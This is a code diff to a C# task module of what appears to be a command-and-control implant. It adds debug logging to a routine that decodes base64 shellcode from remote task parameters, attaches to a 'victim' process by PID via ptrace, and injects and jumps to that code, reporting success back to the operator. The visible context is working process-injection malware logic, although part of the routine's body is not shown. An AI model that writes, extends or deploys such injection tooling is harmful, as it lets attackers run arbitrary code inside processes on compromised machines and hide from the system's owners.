@@ -24,11 +24,13 @@ namespace Workflow
 
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             Console.WriteLine(job.task.parameters);
             InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);
 
             if (!args.Validate(out var message))
             {
+                DebugLog.Log($"{Name} invalid args: {message} [{job.task.id}]");
                 messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
@@ -41,12 +43,14 @@ namespace Workflow
 
             //Create new process
             byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
+            DebugLog.Log($"{Name} shellcode size={buf.Length}, target pid={args.pid} [{job.task.id}]");
 
             int pidMax = GetProcPidMax();
             //long victimPid = Convert.ToInt64(args[0]);
             long victimPid = (long)args.pid;
             if (victimPid == 0 || victimPid > pidMax)
             {
+                DebugLog.Log($"{Name} invalid pid {victimPid} [{job.task.id}]");
                 messageManager.WriteLine("Argument not a valid number. Aborting.", job.task.id, true, "error");
                 return;
             }
@@ -54,6 +58,7 @@ namespace Workflow
             // Attach to the victim process.
             if (PTrace.PtraceAttach(victimPid) < 0)
             {
+                DebugLog.Log($"{Name} PTRACE_ATTACH failed [{job.task.id}]");
                 messageManager.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
@@ -103,7 +108,7 @@ namespace Workflow
             }
 
             messageManager.WriteLine("[*] Successfully injected and jumped to the code.", job.task.id, true);
-
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
 
         }
         const int PID_MAX = 32768;
